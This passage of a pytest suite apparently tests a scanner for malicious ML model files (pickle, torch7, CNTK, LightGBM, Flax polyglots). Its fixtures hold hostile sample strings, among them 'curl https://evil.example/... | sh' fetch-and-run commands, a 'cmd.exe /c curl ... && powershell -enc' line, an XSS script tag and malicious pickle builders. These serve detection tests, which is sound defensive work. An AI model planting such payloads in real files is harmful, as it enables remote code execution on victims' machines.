    polyglot = tmp_path / "crc-failure.py.gz"
    _write_gzip_safetensors_polyglot(polyglot)
    payload = bytearray(polyglot.read_bytes())
    payload[-8] ^= 0x01
    polyglot.write_bytes(payload)

    assert file_detection.detect_file_format(str(polyglot)) == "compressed"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "gzip"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "gzip"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "compressed"
    assert result.success is False


def test_scan_file_merges_torch7_and_safetensors_overlap_findings(tmp_path: Path) -> None:
    header_length = 0x3754
    metadata = json.dumps(
        {
            "__metadata__": {
                "note": (
                    "torch.FloatTensor nn.Sequential cmd = os.execute('curl https://evil.example/x | sh') "
                    "<script>alert(1)</script>"
                )
            },
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
        },
        separators=(",", ":"),
    ).encode()
    polyglot = tmp_path / "torch7-safetensors.unknown"
    polyglot.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + b"\x00"
    )

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.metadata["supplemental_scanners"] == ["torch7"]
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert result.success is False


def test_nested_scan_merges_safetensors_findings_for_gzip_overlap(tmp_path: Path) -> None:
    polyglot = tmp_path / "nested-gzip-safetensors.unknown"
    _write_gzip_safetensors_polyglot(polyglot)

    result = archive_dispatch.scan_nested_file(
        str(polyglot),
        config={"cache_enabled": False, "_archive_depth": 1},
    )

    assert result.scanner_name == "compressed"
    assert "safetensors" in result.metadata["supplemental_scanners"]
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
    assert result.success is False


def test_outer_safetensors_analysis_not_suppressed_by_child_metadata(tmp_path: Path) -> None:
    child = tmp_path / "child.unknown"
    _write_safetensors_pickle_tail(
        child,
        0x0156,
        b"\n0cbuiltins\nset\n.",
    )
    child_member = gzip.compress(child.read_bytes(), mtime=0)
    outer = tmp_path / "outer.gz"
    _write_gzip_safetensors_polyglot(
        outer,
        include_python_payload=False,
        trailing_data=child_member,
    )

    assert file_detection.detect_file_format(str(child)) == "pickle"
    assert file_detection.has_safetensors_routing_candidate(str(outer))
    assert file_detection.detect_file_format(str(outer)) == "compressed"

    result = scan_file(str(outer), config={"cache_enabled": False})

    assert result.scanner_name == "compressed"
    assert any(
        check.name == "SafeTensors XSS/HTML Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert result.success is False

    aggregate = scan_model_directory_or_file(str(outer), cache_enabled=False)
    assert determine_exit_code(aggregate) == 1


def test_nested_scan_merges_torch7_and_safetensors_overlap_findings(tmp_path: Path) -> None:
    header_length = 0x3754
    metadata = json.dumps(
        {
            "__metadata__": {
                "note": (
                    "torch.FloatTensor nn.Sequential cmd = os.execute('curl https://evil.example/x | sh') "
                    "<script>alert(1)</script>"
                )
            },
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
        },
        separators=(",", ":"),
    ).encode()
    polyglot = tmp_path / "nested-torch7-safetensors.unknown"
    polyglot.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + b"\x00"
    )

    result = archive_dispatch.scan_nested_file(
        str(polyglot),
        config={"cache_enabled": False, "_archive_depth": 1},
    )

    assert result.scanner_name == "safetensors"
    assert result.metadata["supplemental_scanners"] == ["torch7"]
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert result.success is False


def test_scan_file_merges_safetensors_findings_after_zip_preflight_rejection(tmp_path: Path) -> None:
    archive_buffer = io.BytesIO()
    with zipfile.ZipFile(archive_buffer, "w") as archive:
        archive.writestr("first.txt", b"one")
        archive.writestr("second.txt", b"two")
    tensor_data = archive_buffer.getvalue()
    header_length = 512
    metadata = json.dumps(
        {
            "__metadata__": {"note": "<script>alert(1)</script>"},
            "tensor": {
                "dtype": "U8",
                "shape": [len(tensor_data)],
                "data_offsets": [0, len(tensor_data)],
            },
        },
        separators=(",", ":"),
    ).encode()
    polyglot = tmp_path / "zip-preflight-safetensors.unknown"
    polyglot.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + tensor_data
    )

    result = scan_file(
        str(polyglot),
        config={"cache_enabled": False, "max_zip_entries": 1},
    )

    assert result.scanner_name == "zip"
    assert "safetensors" in result.metadata["supplemental_scanners"]
    assert any(issue.rule_code == "S410" for issue in result.issues)
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
    assert "_zip_container_dispatched_paths" not in result.to_dict()["metadata"]
    assert result.success is False


def test_scan_file_routes_protocolless_binary_pickle_with_misleading_extension(tmp_path: Path) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    disguised_pickle.write_bytes(_build_protocolless_binary_malicious_pickle())

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_padded_protocolless_binary_pickle_past_probe_limit(tmp_path: Path) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    padding = b"\x8c\x01x0" * (file_detection.PROTO0_1_MAX_PROBE_BYTES // 4)
    disguised_pickle.write_bytes(padding + _build_protocolless_binary_malicious_pickle())

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_does_not_route_benign_binary_padding_past_opcode_budget(tmp_path: Path) -> None:
    near_match = tmp_path / "notes.py"
    near_match.write_bytes(b"\x8c\x01x0" * (file_detection.PROTO0_1_MAX_PROBE_OPCODES + 1))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    assert file_detection.detect_file_format(str(near_match)) == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT
    assert (
        file_detection.detect_file_format_from_magic(str(near_match))
        == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT
    )
    assert (
        file_detection.detect_file_format_for_skip_filter(str(near_match))
        == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT
    )

    reset_cache_manager()
    try:
        first = scan_file(str(near_match), config=config)
        second = scan_file(str(near_match), config=config)

        for result in (first, second):
            assert result.scanner_name == "unknown"
            assert result.success is False
            assert result.metadata["scan_outcome"] == "inconclusive"
            assert result.metadata["analysis_incomplete"] is True
            assert result.metadata["operational_error_reason"] == "pickle_routing_incomplete"
            assert "pickle_routing_incomplete" in result.metadata["scan_outcome_reasons"]
            check = next(check for check in result.checks if check.name == "Pickle Routing")
            assert check.status == CheckStatus.FAILED
            assert check.severity == IssueSeverity.INFO
            assert "bounded structural probe reached its limit" in check.message
            assert check.details["format"] == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT
            assert not [
                issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    nested_result = archive_dispatch.scan_nested_file(str(near_match), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(near_match), cache_scan_results=False)

    assert nested_result.scanner_name == "unknown"
    assert nested_result.success is False
    assert nested_result.metadata["operational_error_reason"] == "pickle_routing_incomplete"
    assert determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_protocolless_pickle_gadget_follows_opcode_budget(tmp_path: Path) -> None:
    delayed_gadget = tmp_path / "delayed.py"
    delayed_gadget.write_bytes(
        (b"\x8c\x01x0" * file_detection.PROTO0_1_MAX_PROBE_OPCODES) + _build_protocolless_binary_malicious_pickle()
    )

    assert file_detection.detect_file_format(str(delayed_gadget)) == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT

    result = scan_file(str(delayed_gadget), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(delayed_gadget), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "pickle_routing_incomplete"
    assert determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_protocolless_pickle_line_operand_exceeds_budget(tmp_path: Path) -> None:
    delayed_gadget = tmp_path / "long-line.py"
    delayed_gadget.write_bytes(
        b"S'"
        + (b"a" * (file_detection.PROTO0_1_MAX_PROBE_BYTES + 1))
        + b"'\n0"
        + _build_protocolless_binary_malicious_pickle()
    )

    assert file_detection.detect_file_format(str(delayed_gadget)) == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT

    result = scan_file(str(delayed_gadget), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "pickle_routing_incomplete"


def test_scan_file_bounds_cumulative_protocolless_pickle_line_operands(tmp_path: Path) -> None:
    delayed_gadget = tmp_path / "many-lines.py"
    line_operand = b"S'" + (b"a" * 1024) + b"'\n0"
    delayed_gadget.write_bytes(
        (line_operand * ((file_detection.PROTO0_1_MAX_PROBE_BYTES // 1024) + 1))
        + _build_protocolless_binary_malicious_pickle()
    )

    assert file_detection.detect_file_format(str(delayed_gadget)) == file_detection.PICKLE_ROUTING_INCONCLUSIVE_FORMAT


@pytest.mark.parametrize(
    "filename",
    [
        "payload.gz",
        "payload.bz2",
        "payload.xz",
        "payload.lz4",
        "payload.zlib",
        "payload.tgz",
        "payload.tbz2",
        "payload.txz",
        "payload.tar.gz",
        "payload.tar.bz2",
        "payload.tar.xz",
    ],
)
def test_scan_file_routes_protocolless_pickle_with_misleading_compressed_suffix(
    tmp_path: Path,
    filename: str,
) -> None:
    disguised_pickle = tmp_path / filename
    disguised_pickle.write_bytes(_build_protocolless_binary_malicious_pickle())

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_open_mark_protocolless_pickle_past_probe_limit(tmp_path: Path) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    padding = b"\x8c\x01x0" * ((file_detection.PROTO0_1_MAX_PROBE_BYTES // 4) - 1) + b"N0N("
    assert len(padding) == file_detection.PROTO0_1_MAX_PROBE_BYTES
    disguised_pickle.write_bytes(padding + b"10" + _build_protocolless_binary_malicious_pickle())

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_protocolless_pickle_with_operand_split_at_probe_limit(tmp_path: Path) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    padding = b"\x8c\x01x0" * ((file_detection.PROTO0_1_MAX_PROBE_BYTES // 4) - 2) + b"X\x0a\x00\x00\x00abcdefghij0"
    disguised_pickle.write_bytes(padding + _build_protocolless_binary_malicious_pickle())

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_protocolless_prefix_before_proto_pickle(tmp_path: Path) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    disguised_pickle.write_bytes(b"\x8f0" + _build_malicious_pickle(protocol=4))

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


@pytest.mark.parametrize(
    ("opcode", "length_header"),
    [
        (b"B", struct.pack("<I", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
        (b"T", struct.pack("<i", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
        (b"X", struct.pack("<I", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
        (b"\x8b", struct.pack("<i", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
        (b"\x8d", struct.pack("<Q", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
        (b"\x8e", struct.pack("<Q", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
        (b"\x96", struct.pack("<Q", file_detection.PROTO0_1_MAX_PROBE_BYTES)),
    ],
)
def test_scan_file_routes_large_protocolless_binary_operand_past_probe_limit(
    tmp_path: Path,
    opcode: bytes,
    length_header: bytes,
) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    operand = b"x" * file_detection.PROTO0_1_MAX_PROBE_BYTES
    disguised_pickle.write_bytes(
        opcode + length_header + operand + b"0" + _build_protocolless_binary_malicious_pickle()
    )

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_truncated_protocolless_binary_pickle_with_security_signal(tmp_path: Path) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    disguised_pickle.write_bytes(_build_protocolless_binary_malicious_pickle()[:-1])

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


@pytest.mark.parametrize(
    "payload",
    [
        b"\x82\x01)R.",
        b"\x83\x01\x00)R.",
        b"\x84\x01\x00\x00\x00)R.",
    ],
)
def test_scan_file_routes_protocolless_binary_pickle_extension_opcodes(
    tmp_path: Path,
    payload: bytes,
) -> None:
    disguised_pickle = tmp_path / "payload.jpg"
    disguised_pickle.write_bytes(payload)

    assert file_detection.detect_file_format(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(disguised_pickle)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_pickle)) == "pickle"

    result = scan_file(str(disguised_pickle), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert any("extension" in issue.message.lower() for issue in result.issues)


@pytest.mark.parametrize("archive_kind", ["zip", "tar"])
def test_scan_file_routes_nested_protocolless_binary_pickle_with_misleading_suffix(
    tmp_path: Path,
    archive_kind: str,
) -> None:
    payload = _build_protocolless_binary_malicious_pickle()
    entry_name = "payload.jpg"
    archive_path = tmp_path / f"payload.{archive_kind}"
    if archive_kind == "zip":
        _create_misnamed_zip(archive_path, {entry_name: payload})
    else:
        with tarfile.open(archive_path, "w") as archive:
            info = tarfile.TarInfo(entry_name)
            info.size = len(payload)
            archive.addfile(info, io.BytesIO(payload))

    result = scan_file(str(archive_path), config={"cache_scan_results": False})

    assert result.scanner_name == archive_kind
    if archive_kind == "zip":
        _assert_system_pickle_detected(result, entry_name)
    else:
        _assert_system_pickle_issue(result)


def test_scan_file_routes_compressed_protocolless_binary_pickle_with_misleading_suffix(tmp_path: Path) -> None:
    compressed_payload = tmp_path / "payload.jpg.gz"
    compressed_payload.write_bytes(gzip.compress(_build_protocolless_binary_malicious_pickle()))

    result = scan_file(str(compressed_payload), config={"cache_scan_results": False})

    assert result.scanner_name == "compressed"
    _assert_system_pickle_issue(result)


@pytest.mark.parametrize("truncate_stop", [False, True])
def test_scan_file_does_not_route_protocolless_binary_pickle_scalar_near_match(
    tmp_path: Path,
    truncate_stop: bool,
) -> None:
    near_match = tmp_path / "notes.jpg"
    payload = _build_protocolless_binary_benign_scalar_pickle()
    near_match.write_bytes(payload[:-1] if truncate_stop else payload)

    assert file_detection.detect_file_format(str(near_match)) == "unknown"
    assert file_detection.detect_file_format_from_magic(str(near_match)) == "unknown"
    assert file_detection.detect_file_format_for_skip_filter(str(near_match)) == "unknown"

    result = scan_file(str(near_match), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert not result.issues


def test_scan_file_routes_malicious_cntk_with_misleading_extension(tmp_path: Path) -> None:
    disguised_cntk = tmp_path / "payload.jpg"
    _write_malicious_cntk(disguised_cntk)

    result = scan_file(str(disguised_cntk))

    assert result.scanner_name == "cntk"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_routes_malicious_lightgbm_with_misleading_extension(tmp_path: Path) -> None:
    disguised_lightgbm = tmp_path / "payload.jpg"
    _write_malicious_lightgbm(disguised_lightgbm)

    result = scan_file(str(disguised_lightgbm))

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_routes_malicious_lightgbm_with_binary_prelude(tmp_path: Path) -> None:
    disguised_lightgbm = tmp_path / "binary-payload.jpg"
    _write_malicious_lightgbm(disguised_lightgbm)
    disguised_lightgbm.write_bytes(b"\x01opaque tree prelude\x00" + disguised_lightgbm.read_bytes())

    result = scan_file(str(disguised_lightgbm))

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize("flax_prefix", [b"\x81\xa6params\xc1\x00", b"\x82\xa6params\x80\xc1\x00"])
def test_scan_file_does_not_let_invalid_flax_prefix_mask_malicious_lightgbm(
    tmp_path: Path,
    flax_prefix: bytes,
) -> None:
    disguised_lightgbm = tmp_path / "malformed-flax-prefix.jpg"
    _write_malicious_lightgbm(disguised_lightgbm)
    disguised_lightgbm.write_bytes(flax_prefix + disguised_lightgbm.read_bytes())

    assert file_detection.detect_file_format(str(disguised_lightgbm)) == "lightgbm"
    assert file_detection.detect_file_format_from_magic(str(disguised_lightgbm)) == "lightgbm"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_lightgbm)) == "lightgbm"

    result = scan_file(str(disguised_lightgbm))

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax", ".msgpack"])
def test_scan_file_routes_native_flax_suffix_lightgbm_content(tmp_path: Path, suffix: str) -> None:
    disguised_lightgbm = tmp_path / f"payload{suffix}"
    _write_malicious_lightgbm(disguised_lightgbm)

    assert file_detection.detect_file_format(str(disguised_lightgbm)) == "lightgbm"
    assert file_detection.detect_file_format_from_magic(str(disguised_lightgbm)) == "lightgbm"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_lightgbm)) == "lightgbm"

    result = scan_file(str(disguised_lightgbm), config={"cache_scan_results": False})

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_does_not_route_native_flax_suffix_lightgbm_near_match(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.flax"
    _write_malicious_lightgbm(near_match, valid=False)

    assert file_detection.detect_file_format(str(near_match)) == "flax_msgpack"
    assert file_detection.detect_file_format_from_magic(str(near_match)) == "unknown"
    assert file_detection.detect_file_format_for_skip_filter(str(near_match)) == "unknown"

    result = scan_file(str(near_match), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert not any(check.name == "Command/Network Correlation Check" for check in result.checks)


@pytest.mark.parametrize("foreign_format", ["rknn", "torch7", "cntk", "lightgbm"])
def test_scan_file_preserves_foreign_findings_in_flax_content_overlap(tmp_path: Path, foreign_format: str) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / f"overlap-{foreign_format}.jpg"
    if foreign_format == "rknn":
        payload.write_bytes(
            b"RKNN\x01\x00\x00\x00"
            b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
            b"callback=http://198.51.100.5:8080/collect\n"
        )
    elif foreign_format == "torch7":
        payload.write_bytes(
            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
        )
    elif foreign_format == "cntk":
        _write_malicious_cntk(payload)
    else:
        _write_malicious_lightgbm(payload)
    payload.write_bytes(
        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert result.bytes_scanned == payload.stat().st_size


def test_scan_file_prefers_strict_cntk_owner_over_inconclusive_flax_probe(tmp_path: Path) -> None:
    payload = tmp_path / "bounded-cntk.jpg"
    _write_malicious_cntk(payload)
    payload.write_bytes(payload.read_bytes() + (b" safe " * (2 * FLAX_MSGPACK_STRUCTURE_READ_BYTES)))

    assert file_detection.detect_file_format(str(payload)) == "cntk"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "cntk"
    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "cntk"

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "cntk"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "cntk_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_preserves_inconclusive_flax_outcome_under_strict_cntk_owner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / "delayed-flax-cntk.jpg"
    _write_delayed_flax_cntk_overlap(payload)

    assert payload.stat().st_size < 10 * 1024 * 1024
    assert file_detection.detect_file_format(str(payload)) == "cntk"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "cntk"

    result = scan_file(str(payload), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(payload), cache_scan_results=False)

    assert result.scanner_name == "cntk"
    assert result.success is False
    assert "cntk_bounded_read_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_preserves_inconclusive_flax_outcome_for_nested_strict_cntk_owner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = tmp_path / "delayed-flax-cntk.jpg"
    _write_delayed_flax_cntk_overlap(nested_payload)
    archive = tmp_path / "delayed-flax-cntk.zip"
    _create_misnamed_zip(archive, {"delayed-flax-cntk.jpg": nested_payload.read_bytes()})

    result = scan_file(str(archive), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(archive), cache_scan_results=False)

    assert result.scanner_name == "zip"
    assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_flax_overlap_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / "unavailable-overlap.jpg"
    _write_malicious_lightgbm(payload)
    payload.write_bytes(
        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )
    original_loader = core_module._registry.load_scanner_by_id

    def load_scanner_by_id(scanner_id: str) -> type[Any] | None:
        if scanner_id == "lightgbm":
            return None
        return original_loader(scanner_id)

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", load_scanner_by_id)

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.details["format"] == "lightgbm"
    assert check.details["preferred_scanner_id"] == "lightgbm"


def test_scan_file_preserves_foreign_findings_in_nested_flax_content_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = tmp_path / "nested-overlap.jpg"
    _write_malicious_lightgbm(nested_payload)
    nested_payload.write_bytes(
        nested_payload.read_bytes()
        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )
    archive = tmp_path / "overlap.zip"
    _create_misnamed_zip(archive, {"nested-overlap.jpg": nested_payload.read_bytes()})

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    "scanner_config",
    [{"exclude_scanners": ["flax_msgpack"]}, {"scanners": ["lightgbm"]}],
    ids=["excluded-flax", "exact-lightgbm"],
)
def test_scan_file_preserves_selected_lightgbm_findings_in_flax_content_overlap(
    tmp_path: Path,
    scanner_config: dict[str, list[str]],
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / "selected-overlap.jpg"
    _write_malicious_lightgbm(payload)
    payload.write_bytes(
        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )

    result = scan_file(str(payload), config={**scanner_config, "cache_scan_results": False})

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("kind") == "preferred"
        and check.details.get("skipped_scanner_id") == "flax_msgpack"
        for check in result.checks
    )


def test_scan_file_preserves_selected_nested_lightgbm_findings_in_flax_content_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = tmp_path / "selected-nested-overlap.jpg"
    _write_malicious_lightgbm(nested_payload)
    nested_payload.write_bytes(
        nested_payload.read_bytes()
        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )
    archive = tmp_path / "selected-overlap.zip"
    _create_misnamed_zip(archive, {"selected-nested-overlap.jpg": nested_payload.read_bytes()})

    result = scan_file(
        str(archive),
        config={"scanners": ["zip", "lightgbm"], "cache_scan_results": False},
    )

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
    cntk_near_match = tmp_path / "cntk-near-match.jpg"
    lightgbm_near_match = tmp_path / "lightgbm-near-match.jpg"
    _write_malicious_cntk(cntk_near_match, include_structure=False)
    _write_malicious_lightgbm(lightgbm_near_match, valid=False)

    assert scan_file(str(cntk_near_match)).scanner_name == "unknown"
    assert scan_file(str(lightgbm_near_match)).scanner_name == "unknown"


@pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax"])
def test_scan_file_fails_closed_for_msgpack_extensions_when_dependency_is_missing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    suffix: str,
) -> None:
    checkpoint = tmp_path / f"model{suffix}"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    result = scan_file(str(checkpoint))

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    library_check = next(check for check in result.checks if check.name == "msgpack Library Check")
    assert library_check.message == "msgpack library not installed - cannot analyze Flax checkpoints"

    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)
    assert aggregate.success is True
    assert core_module.determine_exit_code(aggregate) == 1


def test_scan_file_does_not_route_generic_msgpack_suffix_near_match_without_dependency(
    tmp_path: Path,
